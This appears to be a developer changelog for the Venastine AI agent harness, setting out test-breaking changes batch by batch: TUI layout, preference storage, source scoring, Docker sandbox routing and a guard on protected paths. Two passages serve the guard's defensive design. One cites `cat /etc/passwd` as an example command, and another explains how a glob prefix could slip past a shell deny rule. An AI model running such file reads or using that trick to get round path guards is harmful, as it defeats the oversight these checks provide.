| `VenastineApp.__init__` and `tui.app.run()` no longer take `startup_warnings` | Any caller passing it — `main.py` and two tests in `test_tui.py` | `TypeError: unexpected keyword argument 'startup_warnings'`. The app computes its own from `provider_startup_issues(self.provider_name)` after the §43 restore, which is the only place the resolved pair is known. **Do not re-add the parameter as an injection point for tests**: arrange `providers.json` instead (there is a `_providers_file` helper in `test_tui.py`). A test that hand-writes the warning string never asks the app which provider it is about, which is exactly why the defect shipped green |
| `tests/conftest.py` has a new autouse `isolate_provider_check` | Nothing today; it is why nothing goes flaky | The mount path READS `providers.json` now, so without it `test_a_healthy_mount_adds_no_warning_lines` passes or fails depending on whether the developer has a real ANTHROPIC key. It copies the real file with the keys filled and LEAVES THE PATH ALONE when the file is absent, so the twelve fresh-clone failures AGENTS.md documents stay real. `test_cli.py`'s `startup` fixture opts back out by name, because those tests chdir into an empty directory precisely to be a fresh clone |
| `core/session.py` has no `WINDOW`, `set_window` or `window_for` | Anything reaching for the session window override — `tui/app.py` and ten tests in `test_session_overrides.py` | `AttributeError`. It moved to `core/model_windows.py` and is PERSISTED (WS6): keyed on every `(provider, model)`, surviving `/model` and a restart, and outranking both the provider query and `MODEL_CONTEXT_WINDOWS`. `session.clear()` now returns `["trigger"]` at most. If a test wants a window, call `model_windows.remember_window(provider, model, n)` |
| `compaction.thresholds()` no longer returns `config.COMPACTION_TRIGGER_TOKENS` | Any test asserting the default trigger against that constant | It is `compaction.derived_trigger(model, provider)` = `COMPACTION_TRIGGER_FRACTION × context_limit()`. Assert the RATIO, not a literal, or the test restates one model's arithmetic instead of the rule. `COMPACTION_TRIGGER_TOKENS` still exists and still answers for `pin_measurements`, which has no model in scope — so #89's cap is unchanged and a test about the pin cap needs no edit |
| A wrong `MODEL_CONTEXT_WINDOWS` entry now mistimes CHAT compaction, not just a research backstop | Nothing mechanical — it is the cost WS5 accepts | Under M1 the working-set trigger never consulted the table. It does now. This is why `core/model_windows.py` exists at the user tier and why the fallback still WARNS. If you add a model, add its window |
| `storage.MessageLog` has a `thinking` column; `save_message()` takes `thinking=` | `tests/conftest.py`'s `FakeStorage`, which must mirror `_to_neutral` exactly | The suite does not error, it goes QUIET: the fake reconstructs without the key and every test about replayed reasoning passes against a fake that never had any. Mirror both halves — `save_message` stores it, `_reconstruct` adds the key only when the row carried reasoning. `test_fake_storage_mirror.py` is the pin, and the real round trip belongs in `test_storage_e2e.py` because the claim is about a COLUMN |
| The neutral assistant shape can carry a `thinking` key | Anything asserting the whole dict — `test_storage_e2e.py` had one | Present ONLY when the row carried reasoning, so a pre-§44 message is byte-identical and the assertion still holds for it. If you need a turn with none, do not pass `thinking`; `ModelResponse.thinking` defaults to `None` |
| `_messages_for_provider` takes `model` and `echo_reasoning` | Positional callers passing two arguments — none outside `core/client.py` | Both DEFAULT to the pre-§44 behaviour (no model means no echo; the v1 side is opt-in), so an unchanged call produces an unchanged translation. **A test that drives this function directly cannot see whether `call_model_stream` passes them** — batch 42's lesson, and the reason `test_client_streaming.py` asserts on the recorded REQUEST |
| `_FakeAnthropicClient` records its stream kwargs in `.sent` | Nothing — it is what makes the above assertable | It used to swallow them in a lambda. A double that hides the arguments lets the wiring break with every translation test still green |
| `core/client.py` calls `b.model_dump()` on thinking blocks | A test double whose content blocks are bare `SimpleNamespace` | `AttributeError`, and only on a double that sets `type="thinking"` — every existing one is unaffected because the filter never matches. Give the double a `model_dump`; do NOT soften the call to a `getattr`, because #35's whole lesson is that a `getattr` returning `None` makes an SDK change look like a stream that carried nothing |
| `_thinking_for_provider("ANTHROPIC", …)` returns `{"type": "adaptive", "display": "summarized"}` | A test asserting that dict exactly | Intended, and it is a bug fix rather than a preference: the default is `"omitted"` on every current Anthropic model, which streams thinking blocks with EMPTY text — so §38 rendered nothing at all there for its whole life, silently |
| `main()`'s project path follows `AGENT_WORKSPACE` when it is set | Any test that sets that variable and expects cwd — none did | Intended (WS7). Patch `config.WORKSPACE_DIR` **and** `config.WORKSPACE_DIR_EXPLICIT` together; patching the first alone changes nothing, because the rule is the PRESENCE of the variable and not its value |
| `config.OUTPUT_DIR`'s default is `<AGENT_WORKSPACE>/output` | Anything asserting `./output` with the variable set | Unset, it is still `./output` — the default is one expression with no branch, `os.path.join(os.environ.get("AGENT_WORKSPACE", "."), "output")` |
| `.venastine/CONTEXT.md` is gone; the hub is the project's root `AGENTS.md` | Every test that writes or reads the old path — 20-odd across four files | `FileNotFoundError`, or an assertion that a file was not written. `project_docs.CONTEXT_FILENAME` BECAME `HUB_FILENAME` (it resolves nowhere now), and the name itself lives in `core/workspace_trust.PROJECT_CONTEXT_FILENAME` because the load-bearing fact about it is that a grant covers it. `doc_path()` no longer branches. Index links are siblings, not `../` |
| `workspace_trust.content_files()` returns PROJECT-relative paths | Anything comparing against `.venastine/`-relative ones, and `_catalog_entries` | The entries are `AGENTS.md` and `.venastine/agents/x.md` now. `_catalog_entries` strips the prefix before matching — miss that and the trust prompt still renders, still lists the files, and simply stops saying what any of them would tell the model, which is the half #131 added |
| Every existing workspace-trust grant re-prompts once | Users, not tests | Intended. The digest covers a different set of files, because the set being consented to genuinely changed |
| `_content_hash()` iterates `content_files()` instead of walking | A test that patched `os.walk` to observe the hash | Patch it around `content_files` instead — there is one traversal now, which is the point: a file the listing omits cannot enter the hash. If you re-split them, expect #18 to happen again |
| `is_trusted()` returns True for an empty `.venastine/` | A test arranging an empty directory and expecting a prompt | Nothing loads from an empty directory, so there was never a question to ask. The shortcut asks the LISTING now, which is also what makes a root `AGENTS.md` with no `.venastine/` prompt |

## Batch 43 — who is speaking, and what the session remembers (2026-08-30)

| Change | What breaks | Symptom / fix |
|---|---|---|
| `preferences.load()` / `preferences.remember()` are now `load_theme()` / `remember_theme()` | Anything calling the old names — `tui/app.py` and two tests in `test_tui.py` | `AttributeError: module 'tui.preferences' has no attribute 'load'`. Renamed because the store holds two records now (RM4); `load_model` / `remember_model` are the siblings. **A test patching `tui.app.preferences.remember` goes vacuous rather than failing** — `mocker.patch` on a module attribute that no longer exists raises, but one patched on the wrong name in a NEW test would simply never intercept, which is the shape §22's twelve doubles had |
| Both writers read-modify-write the store | A "simplify: just write the fields we were given" edit to `_remember` | `test_the_two_records_share_a_file_without_clobbering_each_other` goes red, and so does the sibling that loads a pre-batch store. The theme and the model are written at different moments by different commands, so a writer that serialises only its own fields drops the other's — and each half looks correct in its own test, which is why both directions are pinned |
| `VenastineApp.__init__` and `tui.app.run()` take a trailing `cli_pinned` | Positional callers passing five arguments to either | Both default to `False`, so existing calls are unchanged and a test-built app behaves as if no launch flag were given. If a test needs the flag semantics, pass `cli_pinned=True` — do NOT simulate it by comparing the pair against settings, which is the inference RM5 rejects |
| `VenastineApp.__init__` READS the preference store | Any TUI test that cares which model it mounted on | `tests/conftest.py`'s autouse `isolate_ui_preferences` already covers it — the same fixture, for the same reason batch 36 added it: the mount path reads the store, so without it a test passes or fails depending on whether the person running the suite had ever typed `/model`. A test that writes the store must do so BEFORE constructing the app |
| The mount banner can carry `(remembered)` | A test asserting the banner string exactly | It appears only when the pair came from the store, so a test that does not arrange one is unaffected. Assert on the whole line rather than on the model name alone: the `/model` confirmation contains the name too, which made the first version of `test_the_redrawn_banner_reports_the_switched_model` pass against the reverted fix |
| `/model` writes to disk and prints "Remembered for the next launch." only on a write that landed | A test asserting `/model`'s trailing line is the old "This session only…" text | The old line is gone: the fact it stated is no longer true. A failed write WARNS inside `remember_model` and reaches the transcript through `TranscriptLogHandler`, so the command claims nothing it did not do — `test_a_failed_save_still_switches_the_model_and_claims_nothing` is the pin, and it is `/theme`'s rule applied to the second preference |
| `Transcript` draws one `venastine ›` per TURN, retired by the next `user` entry | Any test counting label rows, or asserting a label immediately precedes an answer | Intended (RM1). The label now opens the turn's first model output, reasoning included. Placement is derived from the role sequence in `_entries`, so if you add a role that should break a turn, teach `_render_entry` to clear `_label_in_force` — and check `rerender()` still agrees, because a replay that moves a label is the same defect as one that reflows a paragraph |
| `_cmd_new` clears the transcript and five per-thread fields | A test that arranges state, calls `/new`, and then reads that state back | Intended (RM2), and it is `switch_to_thread`'s list: `_last_run`, `_live_claims`, `_last_response`, `_tool_names`, `_file_calls`. The `_busy` refusal still runs first, so `test_new_thread_is_refused_mid_turn` is unaffected — a refused `/new` clears nothing |
| `on_mount`'s banner line moved into `_write_session_banner()` | A test patching or asserting the banner write at mount | Same text, one producer, now called by `/new` as well. Two copies of a status line are two copies that can disagree |


## Batch 51 — the catalog that was empty (2026-09-02)

| Change | What breaks | Symptom / fix |
|---|---|---|
| `agent_catalog_text()` is no longer `""` on the default install | Any test asserting it is empty, or that `## Available agents` is absent from an attended prompt | `test_spawnable.py::test_none_of_the_four_shipped_agents_is_spawnable` was exactly that test, then `test_exactly_two_shipped_agents_are_spawnable` (batch 51), now `test_exactly_six_shipped_agents_are_spawnable`. A headless prompt is unchanged — `spawn_subagent` is unreachable there (R16) |
| Seven agents ship, not four | A test counting `config_loader.get_agents()` against the real harness tier | Use the roster, not the number. `real_harness_tier` is the fixture that reaches the real files |
| Fourteen skills ship, not four, and `software/` is a new category folder | A test asserting the skill catalog's length, or the set of categories | The catalog grew 610 → 2093 characters and it rides every research pass, so a byte-identical pass-prompt assertion must be regenerated |
| `explore` and `review` are SPAWNABLE | A test asserting that no shipped agent is | That was the assertion §32 wrote to fail on this day; see the first row |
| A new shipped agent must declare `spawnable` | Adding `agents/builtin/x.md` without it | `assert_spawnable_declared` raises at discovery naming every offender. This has always been true; the roster is the first time it applies to more than four files |
| Every tool a shipped agent or skill names must be REGISTERED | A typo in `allowed_tools` / `additional_tools` | `test_shipped_roster.py` fails naming the file and the token. Before this, a whitelist typo silently removed the tool the author meant to include |
| `plan`'s whitelist must remain a superset of every spawnable agent's | Adding a tool to `explore` or `review` without adding it to `plan` | `test_a_spawn_under_plan_loses_nothing` fails. C6 intersects, so the child would silently lose it (A13). That test is now `test_a_spawn_loses_nothing_through_the_composition`, swept over the whole roster, and the rule is scoped by `spawn_targets` — see the `spawn_targets` batch below, which is where the named version's failure is recorded |
| `explore`/`review` declare `read` and `shell`, which global config DENIES | A test assuming a spawned explore can read a file | On a stock install it cannot: `config.ToolPermissions` ships `read`/`write`/`edit`/`shell` as False and D14's global check is unconditional. `STOCK_TOOLS` in `test_shipped_roster.py` is what a default install can actually call |
| Asserting read-only through `is_tool_allowed` for `write`/`edit` is VACUOUS | A "stricter" test that adds them back to the policy-layer check | It answers False whatever the whitelist says. Assert those against the declaration; the policy layer for `write_project_doc`, `remember`, `spawn_subagent` |
| All three new agents set `use_project_context: true` | Setting one back to the default `false` | `test_each_one_receives_the_projects_own_agents_md` fails naming the agent. It was a mutation SURVIVOR before that test existed: the agent goes on answering, without the project's conventions, and nothing reports it |
| `AGENTS.md`'s TUI material moved out of the Skills section | A tool or script keyed on those heading offsets | Nothing in the repo is; the headings are `### The TUI (tui/, §16)`, `### Agents (agents/, §18/§32)`, `### Skills (skills/, §19)` |
| The decision-family map now claims `E1–E14` and `A1–A15` | Nothing — both were already in the record | `test_every_decision_id_the_map_claims_is_in_the_record` pins the claim; note it does NOT pin that a range covers its family, which is how `E13`/`E14` sat outside their own index |

Count 3462 -> 3483.

## Batch 50 — a template for the file that cannot explain itself (2026-09-02)

| Change | What breaks | Symptom / fix |
|---|---|---|
| `generator.generate()` takes `scaffold_docs=True` and `scaffold_config=False` | A caller passing positional arguments past `provider_name` — none does, they are keyword-only | `--config` alone is `(False, True)`: no kind question, no initializer, no spend. Two flags rather than a second entry point, because a config-only path beside `generate()` would be a second answer to "is an existing file overwritten" and a second place to forget the trust settle |
| `/init`'s TUI parser is a token LOOP, and stricter | A test passing `/init software` or `/init ---software` | Both were accepted by the old single `.lstrip("-")` and are now the error. `_split_init_flags(args) -> (kind, scaffold_config, problem)` is the seam to assert against; the flags compose in either written order, following `_split_research_flags` |
| The CLI init fixture builds `args` from `main.build_parser()` | A test constructing a `SimpleNamespace` for `run_init_command` | It went stale the moment `--project-config` was added, failing four tests with an `AttributeError` about the flag rather than anything they were testing. Pass `argv=[...]` to `_run` instead |
| `--project-config` without `--init` EXITS 1 | Nothing today | Deliberately unlike `--software-project` / `--research-project`, which are silently ignored. Those two keep their silence because changing them is a behaviour change with users; this flag has none yet |
| `.venastine/settings.json` and `mcp.json` are written DIRECTLY, not through `write_project_doc` | Any assumption that every `/init` write goes through the tool layer (§24 AC3) | That tool denies `.venastine/` by path segment and names these two files as the reason. **Do not widen its allowlist to "fix" this**: it is advertised to every run and all ten research passes, and `mcp.json` names a local command to execute. The single consent is what replaces the gate |
| The settings template is EVERY key the loader knows, minus `config_files.OMITTED` | Adding a settings key without adding a line to the template | `test_the_template_names_every_setting_the_loader_knows` fails and names the missing key. That is the trade `_KNOWN_TUI`'s comment already takes ("adding a preference is a schema change, on purpose"), moved one file along — the alternative is a schema that has quietly fallen behind, where an omission reads as "this one is not settable" |
| Six keys are omitted because writing their own default is NOT restating it | Any change that adds a presence-sensitive read of a scaffolded key | `test_the_scaffolded_settings_file_changes_nothing` fails, naming the key and both values. Put it in `OMITTED` with the reason — do not adjust the expected value. The six are `default_provider`, `default_model`, `effort`, `compaction.trigger_tokens`, `ensemble_mode` and `research.subagent_review`; `_trigger_is_configured()` is the model of the class, since it asks `"trigger_tokens" in ...` |
| "Inert" includes the LOG | A template key whose value survives the merge but warns on the way | Same test, which compares warnings between a project with the file and one without. `grounding_weights` carries a `None` key, JSON has no null key, and it round-trips as `"null"` — rejected against `GROUNDING_STATUSES` and logged every launch, with every merged number identical |
| `json_store.write_json_atomic` takes `trailing_newline: bool = False` | Nothing — every existing store writes the same bytes | On for the two scaffolded files only: they are the first written through it that a human is meant to edit and commit, and a committed file with no final newline carries git's marker in every diff of it |
| An existing `.venastine/settings.json` or `mcp.json` is never overwritten, per file | Nothing | I12 applied to the file it was written for. A project with a settings.json and no mcp.json still gets the mcp.json, and the run reports what it left alone |

Count 3426 -> 3462.

## Batch 49 — the decision is the part that falls off (2026-09-02)

| Change | What breaks | Symptom / fix |
|---|---|---|
| Every bounded `ScrollBox` is `height: auto; max-height: N`, never `height: N` | Nothing — it is the fix | A definite height bounds what the box DRAWS and not what its parent RESERVES, so the grid row or vertical stack kept growing with the content and the dialog's last children — its buttons — were clipped off the bottom. **Do not "restore" a definite height**: `test_a_bounded_box_reserves_its_bound_not_its_content` fails on both boxes, and it is parametrised because a definite height on the *command* box survived the first mutation pass (it wastes rows without pushing anything out, which is the invisible half) |
| §46 EP3's "a scrollable container asked for `height: auto` resolves to zero" is WRONG | Any reasoning that starts from it | Measured false. The zero was EP1's `1fr` ROW and the box had been measured inside one. With the row `auto`: `height: auto` draws the content, `height: N` draws N and reports the content height upward anyway, `height: auto; max-height: N` draws N and reports N. EP3's `Static` half is unchanged and still true |
| `#permission-dialog` is a `Vertical`, not a `Grid` | A test constructing or querying a `Grid`, or asserting `grid-size`/`grid-rows`/`column-span` | Every child carried `column-span: 2`, so the second column held nothing but the Deny button. `PermissionScreen`, `ConfirmScreen`, `ProjectKindScreen` and `SubagentSignoffScreen`'s empty branch all compose it |
| The `with-headline` class is GONE | `dialog.has_class("with-headline")` — one test asserted it | It existed only to carry a ROW COUNT to the stylesheet, because a Grid's `grid-size` is static and the screen composes three children or four. A Vertical does not care. What that class was FOR is now asserted directly: a tool declaring no headline is not charged the rows one costs |
| Buttons live in `Horizontal` bars: `#permission-buttons`, `#grant-buttons`, `#review-buttons`, `#question-buttons` | A test asserting a Button is a direct child of the dialog | The bar is one child, so the dialog's arithmetic stops depending on how many answers there are. Centred, not stretched — `test_the_decision_bar_is_centred_in_its_dialog` pins the gaps either side rather than the CSS |
| `ReviewScreen`'s four buttons are one ROW, not a stack | A test asserting their vertical order | Stacked they cost 12 of the 18 rows a dialog has at 80×24, so three of the four decisions were off the bottom — every answer except Accept |
| `#claims-body`, `#review-body` and `#question-body` are Statics inside `-box` ScrollBoxes | A test querying those ids for sizing | Same split §46 made for `#permission-params`: the id stays on the Static so `.visual._renderable.plain` still answers what was drawn; sizing assertions go to the `-box` |
| `#grant-list` and `#signoff-list` cap at 8 rows, not 14 | Nothing | #112 bounded the list and nothing bounded the SUM, so the confirm button was still off the bottom with twenty tools offered |
| `#permission-params-box` caps at 7 rows (was a definite 9, or 5 with a headline) | Nothing | One template now serves both shapes, so the taller one sets the budget. Everything past row 7 scrolls, and on the shell modal every line of it also appears above |
| Consent screens open focused on the DECLINING button | A test pressing Enter on a freshly-opened modal and expecting approval | `ConfirmScreen` opened focused on its affirmative button, so Enter said yes. `PermissionScreen`/`ConfirmScreen` → `#deny`, `SubagentSignoffScreen` → `#signoff-refuse`, `ReviewScreen` → `#review-reject`. `GrantPickerScreen` and `ProjectKindScreen` have no declining button and are asserted only not to open on an answer |
| `Button:focus` no longer resolves to `reverse` | A test asserting the focus text-style | `reverse` inverts the LABEL alone, so a focused green Allow drew its word green-on-white. Bold plus `background-tint: $foreground 25%` tints the whole button. Asserted on the RESOLVED style, because the rule has to win against a DEFAULT_CSS nested `&:focus` |
| `QuestionScreen` handles `Input.Submitted` | Nothing | Enter in "…or write your own answer" did nothing at all. It routes through `_answer`, the same helper `on_button_pressed` uses, so there is one answer shape |
| `ask_user` refuses an option over `MAX_OPTION_CHARS` (100) | A test passing a long option | An error, never a trim — M15, the same rule as the count cap beside it. 100 is measured: at 58 columns prose, twenty-character words and an unbroken run all wrap to two lines, and 105 makes two of the three wrap to three |
| `#question-options Button` is `width: 100%` | A test measuring an option button's width | At `width: auto` an option wider than the dialog was CUT at its edge — two options differing only past the cut rendered identically. The fixture must use options of DIFFERENT lengths or the assertion cannot fail: equal-length labels give equal auto widths |

Count 3349 -> 3426.

## Batch 48 — /copy: the last response that was never the last (2026-09-02)

| Change | What breaks | Symptom / fix |
|---|---|---|
| `VenastineApp._last_response` is GONE | Any test or caller reading or arranging it — five in `test_research_legibility.py`, `test_tui.py` and `test_thread_legibility.py` did | `AttributeError`. Read `app._transcript.last_answer()`, and ARRANGE it by writing to the transcript (`write_answer`) rather than by setting a field. That is the whole point: every `/copy last` test set the field by hand, which is why nobody noticed the field was never being set by the app |
| `core.replay.last_assistant_text` is GONE | An import of it — only the TUI and one test had one | `ImportError`. It existed for §27 AC4's state reset, which is now carried by `Transcript.reset()` dropping the entry log. `replay_entries` is untouched |
| `on_turn_finished` no longer captures `flush_stream()`'s return | Nothing — it never worked | It still flushes, because the span still has to be committed. The capture was dead: `on_loop_event_message` flushes at the terminal `final_response` event, so this one always saw a closed span and got `""`. If you find yourself re-adding it, the answer you want is `Transcript.last_answer()` |
| `Transcript.as_text()` takes an optional `roles` | Nothing — it defaults to `None`, which is every entry | `as_text(CONVERSATION_ROLES)` is `/copy conversation`; bare `as_text()` is still `/copy all`'s transcript half, harness lines included (#140) |
| `_COPY_TARGETS` has five entries | A test asserting `/help`'s `/copy` line, or the usage string | Both derive from the tuple. `conversation` sits before `all`, narrow to broad |
| A new transcript role must clear FOUR checks, not three | Adding a role to `MESSAGE_ROLES` in `tests/test_themes.py` | Batch 41's three (pairwise-distinct strings, ≥ 120 redmean separation, no `dim` outside `system`) plus this batch's: it must be in `CONVERSATION_ROLES` or `META_ROLES` in `tui/widgets.py`, and not in both. An unclassified role is silently absent from `/copy conversation` — safe, but nobody decided it |
| A failed tool with no known call id writes role `tool_error`, not `error` | A test asserting that line is bold red, or asserting on the `error` role | Intended. `error` is the harness's own voice and one role cannot mean both; §41 X2's weight rule already said a failed tool is plain rather than bold. The named branch one line above was already `tool_error` |
| `_cmd_new` clears the transcript and FOUR per-thread fields | The batch 43 row above, which says five | `_last_response` left the list. `/copy last` is still cleared by `/new` — through `_transcript.reset()`, which drops the entry log it now reads |

Count 3343 -> 3349.

## Batch 47 — §46, where a command runs and whether anyone can see it (2026-09-02)

| Change | What breaks | Symptom / fix |
|---|---|---|
| `#permission-dialog`'s middle grid row is `auto`, not `1fr` | Nothing — it is the fix | A `1fr` row inside a `height: auto` container resolves to **zero**, so `#permission-params` had `region.height == 0` and `virtual_size.height == 0` on all four screens sharing this dialog: every tool approval, `SubagentSignoffScreen`'s empty branch, `ConfirmScreen` and `ProjectKindScreen`. If you reintroduce a fractional row here, `test_every_modal_actually_draws_its_body` fails naming the widget. **Do not "restore" `1fr` to make the dialog fill space** |
| `#permission-params` and `#permission-command` are `Static`s inside `ScrollBox` containers (`#…-box`) that carry the sizing | A test querying `#permission-params` and expecting the sizing, or querying the box and expecting `.visual` | The ids deliberately stayed on the **Statics** so every existing `query_one("#permission-params").visual._renderable.plain` still answers what was DRAWN. Sizing assertions go to `#permission-params-box`. `ConfirmScreen`/`ProjectKindScreen` still use a bare `Static` with that id, so both shapes are styled |
| A `ScrollBox` needs a DEFINITE height, and a bounded `Static` does not scroll | Any attempt to write `height: auto; max-height: N` on either | Two adjacent traps, both silent: a scrollable container asked for `height: auto` renders at zero rows; a `Static` with `max-height` reports `virtual_size` equal to its clamped box, so `max_scroll_y` is 0 and the hidden rows are gone rather than below the fold. Measured at nine lines in a seven-row block with `End` doing nothing. `test_what_does_not_fit_the_payload_block_can_be_scrolled_to` asserts `visible + reachable == content` |
| `ToolSpec` gains `headline_param`; `registry` gains `headline_param()` / `headline_for()` | Nothing — it defaults to `None` and only `shell` declares one | A tool that declares one gets a pinned block above the notice on its approval modal and a `$` line on the CLI prompt. `headline_for` returns `None` for a non-string rather than coercing: the model's input reaches the gate unvalidated, and a coerced `['cat', '/etc/passwd']` would put a fabricated command in the one place on the screen that must be verbatim |
| The `permission_request` LoopEvent and the APPROVAL `Request` payload carry a `headline` key | Any test asserting the whole dict — `test_streaming_loop.py` has one, again | `assert perm[0] == {...}` fails with an extra key. Batch 42 added `rationale` the same way and the same test caught it; that is the test working. Add `"headline": None` rather than loosening it to a subset check |
| `PermissionScreen.__init__` and `ask_permission_blocking` take a trailing `headline` | Positional callers passing five arguments | Both default to `None`, so existing four-argument calls are unchanged and draw no pinned block |
| `containment_for(INERT, docker_available=True)` now returns `CONTAINED` | Any test asserting INERT is UNCONTAINED — `test_inert_and_host_read_are_both_uncontained` was one | Split into two tests, because the two tiers stopped having one answer. HOST_READ is UNCONTAINED however healthy Docker is, and that is permanent: its defining property is an argument the container cannot see. The APPROVAL answer is unchanged, and `test_moving_inert_into_the_container_did_not_move_the_gate` asserts the two containments agree rather than asserting today's value |
| `run_sandboxed` routes INERT to `_run_docker` when Docker is up | Any test patching `_run_inert` and expecting an inert command to reach it | Pass `docker_available=False` for the light-path case, or patch `_run_docker` and `security.sandbox._log_image_identity`. The container call passes `argv=True`, which runs the command as a pre-split vector instead of through `bash -c` — asserted, because `bash` would be a third tokeniser between the classifier and the executor and the gap between two of them is where #157 arrived twice |
| Every `run_sandboxed` return carries `ran_on` and `tier` | Any test asserting the result dict exactly | Add the keys. `shell.run()`'s `{"error": ...}` paths are deliberately NOT annotated — they never executed anything. `test_every_backend_annotates` walks all six (command, docker) routes, so a route added later that forgets is caught by that rather than by the three spelled-out cases |
| `_run_docker` passes `--label venastine.sandbox=1` | A test asserting the exact argv length or index positions | Assert by `args.index("--label")`, as the existing `--network` tests do |
| `_log_image_identity()` runs at `run_sandboxed`'s docker branch, not inside `_run_docker` | A test that patches `subprocess.Popen` to inspect `_run_docker`'s argv | It was inside `_run_docker` first and broke exactly those tests: `subprocess.run` is implemented via `Popen`, so the image probe was captured by their mock and raised `ValueError: not enough values to unpack`. Keep `_run_docker` a function that builds an argv and opens one process. Patch `security.sandbox._log_image_identity` when driving `run_sandboxed` |

Count 3313 -> 3343.

## Batch 46 — §45, what a source is worth and how close it actually is (2026-09-02)

| Change | What breaks | Symptom / fix |
|---|---|---|
| `score_claim` scales the grounding component by source quality when `sources_scored=True` | Any pipeline test whose Pass 3a payload asserts a `grounded` claim with `"sources": []`, or with a source on a generic host | The claim tiers MEDIUM or LOW where the test expects HIGH. **This is the feature, not a regression**: a claim asserted as grounded while citing nothing now scores at `SOURCE_QUALITY_FLOOR`, and an ordinary `.com` is not a strong source. Fix the FIXTURE — `tests/test_orchestrator._source()` and its twin in `test_critic_routing` build a well-formed entry with an authoritative default URL. Do NOT pass `sources_scored=False` to make a test green; that flag means "no scoring stage ran", and lying about it is how a claim nothing measured gets re-tiered |
| `score_claim(claim)` with no `weights` still scores exactly what it always did | A "tidy-up" that makes `weights` non-optional, or binds `default_weights()` at import | Every byte-for-byte regression in `test_confidence_scoring.py` goes red at once. The default is the whole compatibility property, and the function form exists so a monkeypatched constant is still seen |
| `AUTHORITY_FULL_CREDIT` normalises authority before the product | Retuning it, or removing it as "redundant" | `test_the_tier_still_discriminates_across_the_domain_table` goes red. Without it the formula multiplies two RANK scales and everything from Nature to a Pinterest pin lands MEDIUM — a tier that no longer discriminates. The sweep is the guard; it fails loudly rather than shipping a collapsed table |
| `SOURCE_QUALITY_FLOOR` is 0.25, not 0.4 | Rounding it "back" to a neater number | `test_the_worst_possible_grounding_is_flagged` goes red at exactly 0.4, because `0.5*0.4 + 0.35 == 0.55` IS the MEDIUM threshold — the floor would then guarantee MEDIUM for every grounded claim however bad its sources. Check the arithmetic against `TIER_THRESHOLDS` before moving either |
| Pass 3a and Pass 6b prompts changed shape: `quote`, `authority_adjustment`, `authority_reason`; no `authority_score` | `tests/test_untrusted_content.py`'s pinned digests | `assert actual == digest` fails naming the pass. The digest is what updates, with a comment saying why — the guard's own docstring says so, and the Pass 3b entry is the precedent. **If you did not mean to change a prompt, this is the test telling you that you did** |
| `_translate` takes a `corpus=` sink and `_run_pass*` forward it | A test double replacing `_translate` with a two-argument function | `TypeError: _translate() got an unexpected keyword argument 'corpus'`. It defaults to `None` and collects nothing, so only a double that redefines the signature is affected |
| `run.source_documents` is written only by `_ground_and_score` | Adding a second writer "to keep it fresh" | Nothing fails immediately, which is the danger. It is refreshed at the one seam both grounding sites cross, which is late enough to be complete and early enough that a run dying later still carries its evidence. A second writer is two writers of related data — the shape §22 warns about by name |
| `confidence` and `source_scoring` are TOP-LEVEL settings sections | Moving them under `research` for tidiness | `_NESTED_SETTINGS` supports exactly ONE level, and both the validator and the cross-tier merge iterate it. `research.confidence` silently fails to merge across tiers — the defect review finding F2 already records. Deepening the merge is a separate change with its own tests |
| An out-of-range knob WARNS and falls back; an unknown key still RAISES | A "consistency" edit making `effective_confidence` raise like `effective_compaction` | `test_an_out_of_range_weight_falls_back_and_warns` goes red. The asymmetry is argued in §45: a bad compaction trigger burns model calls on every turn, a bad scoring weight costs one number in one report, and refusing to start a ten-pass run over a typo is the worse failure |
| `core.reasoning.scholar` holds a module-level response cache | Any test injecting a failing `fetch` after another test cached a success | **The suite does not error, it goes QUIET**: the failing fake is never called and the test asserts happily against the cached payload. `tests/conftest.py`'s autouse `clear_scholar_cache` covers it — the same reason `_net_common.TTLCache.clear` exists at all |
| `pipeline_models.resolve("critic")` outranks `config.CRITIC_MODEL` | A test setting `config.CRITIC_MODEL` while a store entry exists | The store wins, by design (SQ7). `isolate_pipeline_models` gives every test an empty one, so `mocker.patch.dict(config.__dict__, ...)` behaves as it always did unless the test itself writes the store |
| `/embedder` remembers only what its probe accepted | A test patching `core.client.embed_texts` on the wrong path | The probe worker imports it as `core.client.embed_texts`; patching a re-export would leave the real function running and the test would hang or reach a provider. Patch the source module, and use `settle` for the result — the probe is a worker, so `await pilot.pause()` alone races it |

### Standing: a fixture that drifts from a prompt makes a stage talk

Since §45 the scoring stage writes a trace line for every kind of malformed source it corrects, and
is SILENT on a clean payload. That silence is what `test_pipeline_trace_contains_expected_lines_in_order`
depends on. So a Pass 3a fixture missing `similarity_score`, or carrying `"sources": []` on a
`grounded` claim, does not merely test something slightly stale — it makes an unrelated test fail
with a message about trace ordering. When a payload fixture and a prompt disagree, fix the fixture.

Count 3271 -> 3313.

---

## Protected-segment guard (`.venastine/`) — `test_file_ops.py` / `test_shell.py`

`security/protected_paths.PROTECTED_SEGMENTS` is ONE list with three consumers: the file tools'
`refusal_check` and three handlers (hard deny), and `shell._shell_approval_check` (always ask).
`project_docs._DENIED_SEGMENTS` unions it rather than re-spelling the segment. The tests pin the
SPLIT as much as the guard, so each half has its own failure signature.

### What breaks it

| Change | Symptom | Fix |
|---|---|---|
| Dropping `refusal_check=file_ops._protected_refusal` from a ToolSpec | **Nothing red at first** — the handler backstop refuses anyway and `dispatch()` returns the same `{"error": ...}`, so `test_dispatch_refuses_without_asking_anyone` stays green. `test_the_registry_knows_the_refusal_pre_approval` is what goes red: it reads `registry.refusal_reason()` directly, because with the backstop in place the wiring half is invisible to a behavior test. The cost of dropping it: a human is prompted for a call the tool would refuse, and a headless denial loses the real reason | Restore the kwarg on the registration at `tools/registry.py` |
| Moving the protected-segment check in `_shell_approval_check` below the `auto_approve_fallback` branch | `test_the_fallback_opt_in_no_longer_covers_a_protected_write` goes red: `touch .venastine/notes.txt` with Docker down and both fallback flags set auto-approves again | The check must precede the fallback branch. The `UNAVAILABLE` short-circuit moved above it is a no-op (the two containment answers are disjoint) and is what lets the check sit before both |
| Making the shell side DENY instead of ask, or "fixing" the deny into `_file_approval_check` | `test_the_approval_layer_is_unchanged_the_deny_is_not_its_job` (file tools) and `test_the_routing_is_unchanged_it_still_classifies_inert` (shell) go red. An approval OR-gate has no answer that DENIES; and a shell deny is a lie a glob prefix (`cat .ven*/x`) walks past — on the INERT tier there is no shell to expand it, so the deny that misses reads as a pass | The file tools deny via `refusal_check` + handlers; the shell only ever ASKS, which is what leaves the full command text in front of a human |
